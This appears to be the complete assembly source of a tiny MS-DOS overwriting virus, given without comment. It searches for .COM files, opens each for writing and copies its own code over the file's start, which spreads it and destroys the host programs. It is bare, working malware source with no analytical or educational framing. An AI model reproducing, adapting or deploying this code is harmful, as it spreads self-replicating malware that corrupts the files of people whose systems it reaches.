Main:           Mov Ah,4eh
On2:            Lea Dx,FileSpec
                Int 21h
                jc on1
                Mov Ah,3dh
                inc ax
                Mov Dx,9eh
                Int 21h
                Mov Bh,40h
                Xchg Ax,Bx
                Lea Dx,Main
                Mov Cl,Length
                Int 21h
                Mov Ah,4fh
On1:            Jmp On2
FileSpec        Db '*.COM',0
Length          Equ $-Main
